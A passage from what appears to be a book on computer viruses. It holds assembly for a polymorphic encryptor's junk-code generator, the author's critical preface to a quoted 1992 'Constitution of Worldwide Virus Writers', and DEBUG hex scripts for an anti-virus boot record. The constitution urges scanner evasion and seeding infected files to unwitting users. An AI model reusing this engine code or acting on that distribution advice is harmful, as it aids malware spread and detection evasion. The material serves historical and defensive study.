&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; short MOV_TEST<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0A6h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
MOV_TEST<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0A0h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;MOV AX,[xxxx] or TEST AX,xxxx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0A8h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pushf</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Random_Number<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">popf</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; short Is_B_or_W<br />
<br />
XCHG_AX_Reg<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">7</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;XCHG AX,reg</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">90h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; no_sp<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
XCHG_AX_Reg2<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; XCHG_AX_Reg &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;XCHG AX,reg / XCHG AX,reg</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
PUSH_POP<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">7</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;PUSH reg / POP reg</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">50h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ah</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">8</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosw</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
INC_DEC<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0Fh</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;INC / DEC</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">40h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; no_sp<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
INC_DEC2<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; INC_DEC &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;INC / DEC or DEC / INC</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">8</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
<span style="color: #adadad; font-style: italic;">abcd</span><span style="color: #ff0000;">3</span><span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;DO rm,xxxx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">80C0h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; no_sp<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xchg</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">al</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosw</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pushf</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Random_Number<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">popf</span><br />
<br />
<span style="color: black; font-style: italic;">;--- Store a byte or word to encryptor --------------------</span><br />
Is_B_or_W<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; short Is_B<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosw</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
Is_B<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
<span style="color: black; font-style: italic;">;--- leave SP alone ---------------------------------------</span><br />
<br />
no_sp<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">7</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; short no_sp_ret<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0FBh</span><br />
<br />
no_sp_ret<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
no_sp2<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">38h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">20h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; short no_sp2_ret<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">20h</span><br />
<br />
no_sp2_ret<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
<span style="color: black; font-style: italic;">;--- don't use [BP+...] -----------------------------------</span><br />
<br />
no_bp2<span style="color: #339933;">:</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">7</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">6</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; short no_bp_ret<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span><br />
<br />
no_bp_ret<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
no_bp<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; short no_bp2<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0FDh</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
<span style="color: black; font-style: italic;">;--- Write byte for JMP/CALL, and fill with random bytes --</span><br />
<br />
Prep_Trash<span style="color: #339933;">:</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xchg</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br />
<br />
Fill_Trash<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Random_Number<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">loop</span>&nbsp; &nbsp; Fill_Trash<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
last<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; end &nbsp; &nbsp; Entry<br />
&nbsp;</div>
<!--p.234-->
<h2><a name="pk"></a>Virus Writer's Code of Ethics</h2>
<p>Do the virus writers have a code of ethics? Not really. Each virus writer has very different reasons for their actions.</p>
<p>Dark Angel, of Phalcon/SKISM, has attempted to form some co-operation between virus writers by proposing a set of governing rules. Unfortunately, this constitution excludes non-English speaking writers, and thwarts the rights of several key individuals, and promotes the spread of computer viruses on the unsuspecting public. In this, the Constitution of Worldwide Virus Writers forfeits its own legitimacy. No follow-up has ever appeared</p>
<!--p.235-->
<h2><a name="pl"></a>The Constitution of Worldwide Virus Writers</h2>
<!--p.236-->
<blockquote>
	<p>Initial Release - February 12, 1992 *</p>
<!--p.237-->
	<p>We, the members of PHALCON/SKISM, in order to form a more perfect environment worldwide for the virus community, establish justice, ensure intracommunity tranquility, provide for the common defense and offense, promote the general welfare, and secure the blessings of liberty to ourselves and our posterity, do ordain and establish this Constitution of Worldwide Virus Writers.</p>
	<h2>ARTICLE I - REGARDING ORIGINAL VIRII</h2>
	<h3>Section A - DEFINITION</h3>
	<p>The term "original virus" herein indicates programming done exclusively by either one individual or group, with no code taken from any other source, be it a book or another virus.</p>
	<h3>Section B - CODE REQUIREMENTS</h3>
	<p>For an original virus to conform to the standards set by this document, it must include the following:</p>
	<ol>
		<li>The title of the virus in square brackets followed by a zero byte should be in the code, in a form suitable for inclusion into SCAN(1). This is to ensure that the name of the virus is known to those examining it.</li>
		<li>The name of the author and his/her group affilition/s should be included in the code, followed by a zero byte. At the present, this is an optional requirement.</li>
		<li>Some form of encryption or other form of stealth techniques must be used. Even a simple XOR routine will suffice.</li>
		<li>If the virus infects files, the code should be able to handle infection of read only files.</li>
		<li>It must have some feature to distinguish it from other virii. Creativity is encouraged above all else.</li>
		<li>The virus must not be detectable by SCAN.</li>
	</ol>
	<h3>Section C - IMPLEMENTATION</h3>
<!--p.238-->
	<p>This section, and all sections hereafter bearing the heading "IMPLEMENTATION" refer to the recommended method of implementation of the suggestions/requirements listed in the current article.</p>
	<ol>
		<li>Virus_Name db '[Avocado]',0</li>
		<li>Author db 'Dark Angel, PHALCON/SKISM',0</li>
	</ol>
	<h2>ARTICLE II - REGARDING "HACKED" VIRII</h2>
	<h3>Section A - DEFINITION</h3>
	<p>The term "hacked virus" herein refers to any virus written by either one individual or a group which includes code taken from any other source, be it a book, a code fragment, or the entire source code from another virus.</p>
	<p>The term "source virus" herein refers to the virus which spawned the "hacked virus."</p>
	<h3>Section B - CODE REQUIREMENTS</h3>
	<p>For a "hacked" virus to conform to the standards set forth by this document, it must include the following, in addition to all the requirements set down in Article I of this document:</p>
	<ol>
		<li>The title, author (if available), and affiliation of the author (if available) of the original virus.</li>
		<li>The author of the hacked virus must give the source code of said virus to the author of the source virus upon demand.</li>
		<li>No more Jerusalem, Burger, Vienna, Stoned, and Dark Avenger hacks are to be written.</li>
		<li>The source virus must be improved in some manner (generally in efficiency of speed or size).</li>
		<li>The hacked virus must significantly differ from the source virus, i.e. it cannot be simply a text change.</li>
	</ol>
<!--p.239-->
	<h3>Section C - IMPLEMENTATION</h3>
	<ol>
		<li>Credit db 'Source stolen from Avocado by Dark Angel of PHALCON/SKISM',0</li>
	</ol>
	<h2>ARTICLE III - REGARDING VIRAL STRAINS</h2>
	<h3>Section A - DEFINITION</h3>
	<p>The term "viral strain" herein refers to any virus written by the original author which does not significantly differ from the original. It generally implies a shrinking in code size, although this is not required.</p>
	<h3>Section B - CODE REQUIREMENTS</h3>
	<p>For a "viral strain" to conform to the standards set by this document, it must include the following, in addition to all the requirements set down in Article I of this document:</p>
	<ol>
		<li>The name of the virus shall be denoted by the name of the original virus followed by a dash and the version letter.</li>
		<li>The name of the virus must not change from that of the original strain.</li>
		<li>A maximum of two strains of the virus can be written.</li>
	</ol>
	<h3>Section C - IMPLEMENTATION</h3>
	<ol>
		<li>Virus_Name db '[Avocado-B]',0</li>
	</ol>
	<h2>ARTICLE IV - DISTRIBUTION</h2>
	<h3>Section A - DEFINITION</h3>
	<p>The term "distribution" herein refers to the transport of the virus through an infected file to the medium of storage of a third (unwitting) party.</p>
<!--p.240-->
	<h3>Section B - INFECTION MEDIUM</h3>
	<p>The distributor shall infect a file with the virus before uploading. Suggested files include:</p>
	<ol>
		<li>Newly released utility programs.</li>
		<li>"Hacked" versions of popular anti-viral software, i.e. the version number should be changed, but little else.</li>
		<li>Beta versions of any program. The infected file, which must actually do something useful, will then be uploaded to a board. The following boards are fair game:
		<ol>
			<li>PD Boards</li>
			<li>Lamer boards</li>
			<li>Boards where the sysop is a dick</li>
		</ol></li>
	</ol>
	<p>No virus shall ever be uploaded, especially by the author, directly to an antivirus board, such as HomeBase or Excalibur.</p>
	<h3>Section C - BINARY AND SOURCE CODE AVAILABILITY</h3>
	<p>The binary of the virus shall not be made available until at least two weeks after the initial (illicit) distribution of the virus. Further, the source code, which need not be made available, cannot be released until the latest version of SCAN detects the virus. The source code, should it be made available, should be written in English.</p>
	<h3>Section D - DOCUMENTATION</h3>
	<p>Documentation can be included with the archive containing the binary of the virus, although this is optional. The author should include information about the virus suitable for inclusion in the header of VSUM(2). A simple description will follow, though the author need not reveal any "hidden features" of the virus. Note this serves two purposes:</p>
<!--p.241-->
	<ol>
		<li>Enable others to effectively spread the virus without fear of self-infection.</li>
		<li>Ensure that your virus gets a proper listing in VSUM.</li>
	</ol>
	<h2>ARTICLE V - AMENDMENTS</h2>
	<h3>Section A - PROCEDURE</h3>
	<p>To propose an amendment, you must first contact a PHALCON/SKISM member through one of our member boards. Leave a message to one of us explaining the proposed change. It will then be considered for inclusion. A new copy of the Constitution will then be drafted and placed on member boards under the filename "PS-CONST.TXT" available for free download by all virus writers. Additionally, an updated version of the constitution will be published periodically in 40HEX.</p>
	<h3>Section B - AMENDMENTS</h3>
	<p>None as of this writing.</p>
	<h2>ARTICLE VI - MISCELLANEOUS</h2>
	<h3>Section A - WHO YOU CAN MAKE FUN OF</h3>
	<p>This is a list of people who, over the past few years, have proved themselves to be inept and open to ridicule.</p>
	<ol>
		<li>Ross M. Greenberg, author of FluShot+</li>
		<li>Patricia (What's VSUM?) Hoffman.</li>
		<li>People who post "I am infected by Jerusalem, what do I do?" or "I have 20 virii, let's trade!"</li>
		<li>People who don't know the difference between a virus and a trojan.</li>
		<li>Lamers and "microwares puppies"</li>
	</ol>
<!--p.242-->
	<h3>Section B - WHO YOU SHOULDN'T DIS TOO BADLY</h3>
	<p>This is a list of people who, over the past few years, have proved themselves to be somewhat less inept and open to ridicule than most.</p>
	<ol>
		<li>John McAfee, nonauthor of SCAN</li>
		<li>Dennis, true author of SCAN</li>
	</ol>
	<h3>Section C - MOTIVATION</h3>
	<p>In most cases, the motivation for writing a virus should not be the pleasure of seeing someone else's system trashed, but to test one's programming abilities.</p>
</blockquote>
<!--p.243-->
<h2><a name="pm"></a>Debug Scripts</h2>
<p>These debug scripts can be used in place of the source codes to compile all executable files listed in this book. To compile a debug script, enter it into a text file as shown. Feed the file into DEBUG.COM by typing:</p>
<pre class="source">
DEBUG &lt; SCRIPT.DBG
</pre>
<!--p.244-->
<h3><a name="pm1"></a>PC Scavenger Anti-Virus Master Boot Record</h3>
<p>Please read the documentation in Chapter 3 for information on using the 2 ensuing files.</p>
<h4><a name="pm11"></a>Partition Code</h4>
<pre class="source">
n pcscav.bin
e 100 FA 2B C0 8E D0 BC 00 7C 8B F4 50 50 07 1F FB FC
e 110 BF 00 06 B9 00 01 F2 A5 EA 1D 06 00 00 BE C6 06
e 120 E8 92 00 BE BE 07 B3 04 80 3C 80 74 0E 80 3C 00
e 130 75 1C 83 C6 10 FE CB 74 15 EB ED 8B 14 8B 4C 02
e 140 8B EE 83 C6 10 FE CB 74 0D 80 3C 00 74 F4 BE 0F
e 150 07 E8 61 00 EB FE BF 05 00 BB 00 7C B8 01 02 57
e 160 CD 13 5F 73 0F 33 C0 CD 13 4F 75 ED BE 26 07 E8
e 170 43 00 EB FE A1 13 04 3D 80 02 BE 2F 07 72 11 C4
e 180 06 4C 00 8C C3 B1 04 D3 E8 03 C3 73 18 BE 42 07
e 190 50 E8 21 00 BE 51 07 E8 1B 00 2A E4 CD 16 0C 20
e 1A0 3C 79 75 FE 58 BF FE 7D 81 3D 55 AA 75 BE 8B F5
e 1B0 EA 00 7C 00 00 AC 3C 00 74 0B 56 BB 07 00 B4 0E
e 1C0 CD 10 5E EB F0 C3 50 43 20 53 43 41 56 45 4E 47
e 1D0 45 52 20 41 6E 74 69 2D 56 69 72 75 73 20 4D 61
e 1E0 73 74 65 72 20 42 6F 6F 74 20 52 65 63 6F 72 64
e 1F0 0D 0A 28 63 29 31 39 39 33 20 4B 61 72 73 74 65
e 200 6E 20 4A 6F 68 61 6E 73 73 6F 6E 0D 0A 0A 00 50
e 210 61 72 74 69 74 69 6F 6E 20 54 61 62 6C 65 20 62
e 220 61 64 2E 2E 2E 00 4F 53 20 45 72 72 6F 72 00 4D
e 230 65 6D 6F 72 79 20 68 61 73 20 73 68 72 75 6E 6B
e 240 21 00 49 4E 54 20 31 33 68 20 4D 6F 76 65 64 21
e 250 00 0D 0A 42 6F 6F 74 20 61 6E 79 77 61 79 3F 0D
e 260 0A 0A 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 270 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 280 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
